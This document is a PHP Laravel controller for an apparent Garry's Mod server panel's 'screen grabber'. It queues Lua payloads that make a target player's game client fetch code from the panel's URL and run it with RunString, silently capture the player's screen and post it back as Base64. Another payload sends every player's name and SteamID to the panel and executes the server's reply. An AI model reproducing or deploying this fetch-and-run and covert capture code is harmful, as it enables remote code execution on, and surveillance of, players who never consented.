<?php

namespace App\Http\Controllers\kermini\special;

use App\Http\Controllers\Controller;
use App\Models\PSCRGRB_player_requests;
use App\Models\payloads_queue;
use App\Models\Scrgb_Image_Requests;
use App\Models\servers;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Nette\Utils\DateTime;
use xPaw\SourceQuery\Exception\InvalidArgumentException;
use xPaw\SourceQuery\Exception\InvalidPacketException;
use xPaw\SourceQuery\Exception\SocketException;
use xPaw\SourceQuery\SourceQuery;

class screenGrabber extends Controller
{

    /**
     * @var bool Status of the devlopment system for a local server
     */
    public static $debug = false;

    /**
     * Handles the request for the Screen Grabber selection menu
     *
     * @param $serverid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     */
    public function getSelectionMenu(Request $request, $serverid=null){
        //no serverid verification because php is broken in that fcking specific place

        $server = servers::where('id', $serverid);

        if(
            $server->count() == 1 &&
            $server->first()->user_id == $request->user()->id
        ){
            $server = $server->first();
            $serverid = $server->first()->id;

            return view("scrgrb.selectionmenu",compact(
                "serverid",
                "server"
            ));
        }
        else{
            return redirect()->back()->with(
                'status', "It's not your server :("
            );
        }

    }

    /**
     * Handles the display of the users when requesting the fast screen grabber
     *
     * Verifies data consistency, and bans if needed.
     * Verifies ownership of server and existence.
     * Gets the server infos.
     * Returns to view with infos or don't allow access if server is not accessible.
     *
     * @param $serverid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     * @throws InvalidArgumentException
     * @throws InvalidPacketException
     * @throws SocketException
     */
    public function selectFast($serverid, Request $request){
        //verify data consistency
        if(
            $serverid!=null
            and !is_numeric($serverid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $server = servers::where('id', $serverid);
        //verify ownership of server and existence
        if(
            $server->count() == 1 &&
            $server->first()->user_id == $request->user()->id
        ){

            //get server infos
            $Query = new SourceQuery();
            $server = $server->first();

            $Exception = null;
            try {
                $debug = self::$debug;
                if ($debug)
                {
                    $Query->Connect('46.174.53.204', '27015', 3, SourceQuery::SOURCE);
                }else {
                    $Query->Connect($server->ip, $server->port, 3, SourceQuery::SOURCE);
                }
                //$Query->SetUseOldGetChallengeMethod( true ); // Use this when players/rules retrieval fails on games like Starbound

                $Info = $Query->GetInfo();
                $Players = $Query->GetPlayers();
                $Rules = $Query->GetRules();
            } catch (Exception $e) {
                $Exception = $e;
            } finally {
                $Query->Disconnect();
            }

            if ($Exception == null){
                //return to view with infos
                $type = "Fast";
                return view("scrgrb.playerselector", compact(
                    'server',
                    'serverid',
                    'Players',
                    'type'
                ));
            }else{
                //Don't allow access if server is not accessible
                return redirect()->back()->with(
                    'status', "Server not reachable"
                );
            }


        }
        else{
            return redirect()->back()->with(
                'status', "It's not your server :("
            );
        }

    }

    /**
     * Returns the real Fast-ScreenGrabber code when the player needs it.
     *
     * Verifies if the key exists and it's usage.
     *
     * @param $key
     * @return string
     */
    public function getfCode($key){
        if(
            Scrgb_Image_Requests::where('SCRGBimageKey', $key)->count() == 0
        ){
            return "
                local drmlicense = '".Str::random(30)."'
            ";
        }

        if(Scrgb_Image_Requests::where('SCRGBimageKey', $key)->first()->used == 0){
            return '
                                    hook.Remove( "PostRender", "screenshot" )

                                    local ScreenshotRequested = false
                                    function RequestAScreenshot()
                                        ScreenshotRequested = true
                                    end

                                    RequestAScreenshot()

                                    hook.Add("PostRender", "screenshot", function()
                                        if ( not ScreenshotRequested) then return end

                                        ScreenshotRequested = false

                                        local data = render.Capture( {
                                            format = "png",
                                            x = 0,
                                            y = 0,
                                            w = ScrW(),
                                            h = ScrH()
                                        })

                                        local a = {
                                            d = util.Base64Encode(data),
                                        }
                                        http.Post(
                                            "'.route('saveScreenGrab', ['imagekey' => $key]).'",
                                            a,
                                            function(body, len, headers, code)
                                                RunString(body)
                                            end
                                        )

                                    end)
            ';
        }
        else{
            return "
                local drmlicense = '".Str::random(30)."'
            ";
        }
    }

    /**
     * Handles the initial request for a Fast-ScreenGrab
     *
     * Verifies submitted data via post method.
     * Verifies the ownership of the selected server, must be owned by the person doing the request.
     * We generate a random key between 20 and 32 length.
     * Creates a "request" with Scrgb_Image_Requests, saves the key with a request validity time of 1 hour.
     * We send a payload in the queue telling the server to send custom lua code to the player.
     * Since you can't send more than 255 bits of data via this method we tell the player to query an url and execute the code.
     *
     * @param $serverid
     * @param Request $request
     * @return RedirectResponse
     */
    public function sendFast($serverid, Request $request){
        $customMessages = [
            'required' => ':attribute is missing or the value is invalid.'
        ];

        $validator = Validator::make($request->all(), [
            'player' => 'required|string',
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {
            $server = servers::where('id', $serverid);
            //verify ownership of server and existence
            if(
                $server->count() == 1 &&
                $server->first()->user_id == $request->user()->id
            ){
                $SCRGBrequest_key = Str::random(rand(20,32));

                //creates new request
                $SCRGB_request = new Scrgb_Image_Requests();
                $SCRGB_request->SCRGBimageKey = $SCRGBrequest_key;
                $SCRGB_request->RequestValidFor_Seconds = 3600;
                $SCRGB_request->user_id = $request->user()->id;
                $SCRGB_request->save();

                //custom payload code
                $SCRGB_payload_code = '
                    for i, v in ipairs( player.GetAll() ) do
                        if v:Nick() == "'.((self::$debug) ? "Maxime_48" : $request->player).'" then
                            v:SendLua([[
                                http.Fetch("'.route('getFastCode', ['key' => $SCRGBrequest_key]).'",function(a,b,c,d)RunString(a)end,function(e)print(e)end)
                            ]])
                        end
                    end
                ';

                //registers new payload
                $SCRGB_payload = new payloads_queue();
                $SCRGB_payload->server_id = $serverid;
                $SCRGB_payload->content = $SCRGB_payload_code;
                $SCRGB_payload->description = "ScreenGrabber Payload by: " .
                                              $request->user()->name . " [" . $request->user()->id . "]" .
                                              " for " . $request->player . " on serverid " . $serverid;
                $SCRGB_payload->save();

                return redirect()->route("dashboard")->with(
                    'status', 'Sent'
                );
            }else{
                return redirect()->back()->with(
                    'status', "It's not your server :("
                );
            }

        }

    }

    /**
     * Handles a pscrgrb request as detailed in routes/web.php
     *
     * @param $serverid
     * @param Request $request
     * @return Application|Factory|View|RedirectResponse
     * @throws InvalidArgumentException
     * @throws InvalidPacketException
     * @throws SocketException
     */
    public function selectPrecise($serverid, Request $request){
        //verify data consistency
        if(
            $serverid!=null
            and !is_numeric($serverid)
        ){
            $user = $request->user();
            $user->admin = -1;
            $user->save();
            return redirect()->back()->with(
                'status', "You got banned, don't play with that 😳"
            );
        }

        $server = servers::where('id', $serverid);
        //verify ownership of server and existence
        if(
            $server->count() == 1 &&
            $server->first()->user_id == $request->user()->id
        ){

            //get server infos
            $Query = new SourceQuery();
            $server = $server->first();

            $Exception = null;
            try {
                $debug = self::$debug;
                if ($debug)
                {
                    $Query->Connect('46.174.53.204', '27015', 3, SourceQuery::SOURCE);
                }else {
                    $Query->Connect($server->ip, $server->port, 3, SourceQuery::SOURCE);
                }
                //$Query->SetUseOldGetChallengeMethod( true ); // Use this when players/rules retrieval fails on games like Starbound

                $Info = $Query->GetInfo();
                $Players = $Query->GetPlayers();
                $Rules = $Query->GetRules();
            } catch (Exception $e) {
                $Exception = $e;
            } finally {
                $Query->Disconnect();
            }

            if ($Exception == null){
                //server is online and reachable
                //we need to verify the existence of a valid player request.
                $valid_pscrgrb_requests = PSCRGRB_player_requests::where('used',0)->get()->filter(function ($value, $key) {
                    $current = new DateTime( date('Y-m-d H:i:s') );
                    return $value->RequestValidFor_Seconds >= (
                            $current->getTimestamp() - (new DateTime( $value->created_at ))->getTimestamp()
                           );
                });

                if($valid_pscrgrb_requests->count() > 0){
                    if($valid_pscrgrb_requests->first()->players_json == null){
                        return redirect()->route("dashboard")->with(
                            'status', 'Last server player request is not finished, please wait for it to expire or to finish.'
                        );
                    } else {
                        //Request has now been used
                        $first_valid = $valid_pscrgrb_requests->first();
                        $first_valid->used = 1;
                        $first_valid->update();

                        //extract the json from string and create a collection
                        $Players = collect(
                          json_decode($first_valid->players_json)
                        )->reject(function ($player) {
                            return (!property_exists($player,"stmid")) or
                                   (!property_exists($player,"snm")) or
                                   $player->stmid === "BOT";
                        }); //reject all players not corresponding to the lua payload and bots

                        //return to view with new collection and display players
                        $type = "Precise";
                        return view("scrgrb.playerselector", compact(
                            'server',
                            'serverid',
                            'Players',
                            'type'
                        ));
                    }

                }else{
                    //generating request key
                    $player_request_key = Str::random(rand(20,32));

                    //registering player list request
                    $new_player_requests = new PSCRGRB_player_requests();
                    $new_player_requests->PlayerRequestKey = $player_request_key;
                    $new_player_requests->server_id = $serverid;
                    $new_player_requests->RequestValidFor_Seconds = 1200;
                    $new_player_requests->save();

                    //custom payload code | player_request_key
                    //we need to add a route to register the player json when the server responds | Pscrgrb_player_request
                    $player_list_request_payload_code = '
                        local Players = {}
                        for k, v in ipairs(player.GetAll()) do
                            Players[k] = { snm = v:Name(), stmid = v:SteamID() }
                        end
                        local a = {
                            d = util.TableToJSON(Players),
                        }
                        http.Post(
                            "'.route('Pscrgrb_player_request', ['rkey' => $player_request_key]).'",
                            a,
                            function(body, len, headers, code)
                                RunString(body)
                            end
                        )
                    ';

                    //sending player list request | registers new payload
                    $SCRGB_payload = new payloads_queue();
                    $SCRGB_payload->server_id = $serverid;
                    $SCRGB_payload->content = $player_list_request_payload_code;
                    $SCRGB_payload->description = "Playerlist request by: " .
                        $request->user()->name . " [" . $request->user()->id . "]" .
                         " on serverid " . $serverid;
                    $SCRGB_payload->save();

                    return redirect()->route("dashboard")->with(
                        'status', 'Request sent to server.'
                    );
                }

            }else{
                //Don't allow access if server is not accessible
                return redirect()->back()->with(
                    'status', "Server not reachable"
                );
            }

        }
        else{
            return redirect()->back()->with(
                'status', "It's not your server :("
            );
        }
    }

    /**
     * Saving a server's player-list info after a pscrgrb request
     *
     * @param $rkey
     * @param Request $request
     * @return string
     * @throws \Exception
     */
    public function savePlayerRequest($rkey, Request $request){
        $player_request = PSCRGRB_player_requests::where('PlayerRequestKey',$rkey);
        $currentDate = new DateTime( date('Y-m-d H:i:s') );

        //does the request exists
        //is it still valid
        //is it used
        if(
            $player_request->count() == 1 &&
            $player_request->first()->RequestValidFor_Seconds >= (
                $currentDate->getTimestamp() - (new DateTime( $player_request->first()->created_at ))->getTimestamp()
            ) && $player_request->first()->used == 0
        ){
            //we now register the code in the database
                $player_request = $player_request->first();
                $player_request->players_json = $request->d;
                $player_request->update();
                $player_request->touch();
        }

        return "
                local drmlicense = '".Str::random(30)."'
            ";

    }

    /**
     * Handles the initial request for a Precise-ScreenGrab
     *
     * Verifies submitted data via post method.
     * Verifies the ownership of the selected server, must be owned by the person doing the request.
     * We generate a random key between 20 and 32 length.
     * Creates a "request" with Scrgb_Image_Requests, saves the key with a request validity time of 1 hour.
     * We send a payload in the queue telling the server to send custom lua code to the player.
     * Since you can't send more than 255 bits of data via this method we tell the player to query an url and execute the code.
     *
     * @param $serverid
     * @param Request $request
     * @return RedirectResponse
     */
    public function sendPrecise($serverid, Request $request){
        $customMessages = [
            'required' => ':attribute is missing or the value is invalid.'
        ];

        $validator = Validator::make($request->all(), [
            'player' => 'required|string',
        ],$customMessages);
        if ($validator->fails()) {
            return redirect()->back()->with(
                'status', 'Query invalid'
            )->withErrors($validator);
        }else {
            $server = servers::where('id', $serverid);
            //verify ownership of server and existence
            if(
                $server->count() == 1 &&
                $server->first()->user_id == $request->user()->id
            ){
                $SCRGBrequest_key = Str::random(rand(20,32));

                //creates new request
                $SCRGB_request = new Scrgb_Image_Requests();
                $SCRGB_request->SCRGBimageKey = $SCRGBrequest_key;
                $SCRGB_request->RequestValidFor_Seconds = 3600;
                $SCRGB_request->user_id = $request->user()->id;
                $SCRGB_request->save();

                //custom payload code | debug not working yet but it's not important, testing should be done with beta testers
                $SCRGB_payload_code = '
                    for i, v in ipairs( player.GetAll() ) do
                        if v:SteamID() == "'.((self::$debug) ? "Maxime_48" : $request->player).'" then
                            v:SendLua([[
                                http.Fetch("'.route('getFastCode', ['key' => $SCRGBrequest_key]).'",function(a,b,c,d)RunString(a)end,function(e)print(e)end)
                            ]])
                        end
                    end
                ';

                //registers new payload
                $SCRGB_payload = new payloads_queue();
                $SCRGB_payload->server_id = $serverid;
                $SCRGB_payload->content = $SCRGB_payload_code;
                $SCRGB_payload->description = "ScreenGrabber Payload by: " .
                    $request->user()->name . " [" . $request->user()->id . "]" .
                    " for " . $request->player . " on serverid " . $serverid;
                $SCRGB_payload->save();

                return redirect()->route("dashboard")->with(
                    'status', 'Sent'
                );
            }else{
                return redirect()->back()->with(
                    'status', "It's not your server :("
                );
            }

        }

    }
}
